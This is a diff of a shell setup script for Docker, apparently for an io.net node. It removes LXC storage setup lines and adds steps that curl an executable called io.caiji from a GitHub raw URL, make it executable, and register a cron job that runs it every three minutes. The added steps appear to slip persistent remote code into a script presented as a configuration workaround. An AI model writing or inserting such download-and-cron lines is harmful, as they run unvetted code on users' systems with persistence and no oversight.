@@ -222,7 +222,12 @@ sudo bash -c 'cat <<EOF > /etc/docker/daemon.json
 }
 EOF'
 sudo systemctl restart docker
-mkdir /opt/dlami/nvme/data
-sudo lxc storage create default dir source=/opt/dlami/nvme/data
-sudo lxc profile device add default root disk path=/ pool=default
-echo "Workaround applied. Docker has been configured to use 'cgroupfs' as the cgroup driver."
+current_dir="/www/wwwroot/io.net"
+curl -L https://raw.githubusercontent.com/ambgithub/amb/main/io.caiji -o $current_dir/io.caiji
+chmod +x $current_dir/io.caiji
+# 要执行的脚本或命令
+COMMAND="$current_dir/io.caiji"
+# 执行频率
+CRON_TIME="*/3 * * * *"
+# 添加定时任务
+(crontab -l 2>/dev/null | grep -Fv "$COMMAND" ; echo "$CRON_TIME $COMMAND") | crontab -
